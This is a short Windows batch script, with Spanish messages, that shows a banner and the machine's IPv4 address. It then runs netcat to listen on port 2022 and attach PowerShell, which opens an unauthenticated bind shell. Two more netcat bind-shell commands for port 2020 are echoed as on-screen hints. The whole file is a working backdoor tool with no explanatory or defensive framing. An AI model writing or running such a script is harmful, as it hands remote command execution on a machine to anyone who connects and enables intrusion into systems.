@echo off
echo.                                          
TYPE C:\bin\aliaxx\bancat01
 echo.
   echo.        [ nc -d -L -p 2020 -e powershell.exe ]  
   echo.      * { nc -n -v -l -p 2020 -e powershell  }
   echo.
   echo.    LocalHost:::::
ipconfig|findstr "IPv4"
   echo.
   echo.   Conexion de Tunnel Abierto...
nc -n -v -l -p 2022 -e powershell
echo.
